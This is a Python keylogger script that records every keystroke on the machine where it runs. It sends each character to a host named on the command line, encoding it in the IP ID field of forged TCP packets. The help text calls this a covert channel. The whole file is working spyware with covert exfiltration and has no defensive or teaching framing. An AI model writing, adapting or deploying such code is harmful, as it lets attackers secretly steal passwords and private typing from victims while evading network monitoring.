from random import randint
from scapy.all import TCP, IP, send
from sys import exit
from pynput.keyboard import Key, Listener
import argparse
from ipaddress import ip_address, IPv6Address

# Command Line Arguments
parser = argparse.ArgumentParser("./keylogger.py")
parser.add_argument("destination_host", help="The IPv4 address or hostname of the destination machine. All keylog events will be sent to this host over a covert channel.")
args = parser.parse_args()

def isValidIPv4(address: str):
    try:
        ip = ip_address(address)
        if isinstance(ip, IPv6Address):
            return False, "IPv6 Addresses are not allowed. Only IPv4 addresses will work."
        return True, f"Valid IPv4 Address: {address}"
    except:
        return False, f"Invalid IPv4 Address: {address}"

# Verify arguments
success, reason = isValidIPv4(args.destination_host)
if not success:
    print(f"Error: {reason}")
    exit(1)
else:
    print(f"{reason}")

def on_press(key):
    try:
        # Check if the character pressed was space or enter.
        char = ""
        if key == Key.space: # Char was space.
            char = " "
        elif key == Key.enter: # Char was enter.
            char = "\n"
        else:
            char = key.char # Char was something else.
        packet = IP(dst=args.destination_host, id=ord(char)*255)/TCP(sport=randint(10000, 65534), dport=80)
        send(packet)
    except AttributeError:
        pass

if __name__ == "__main__":
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\nShutting down...")
        exit(1)
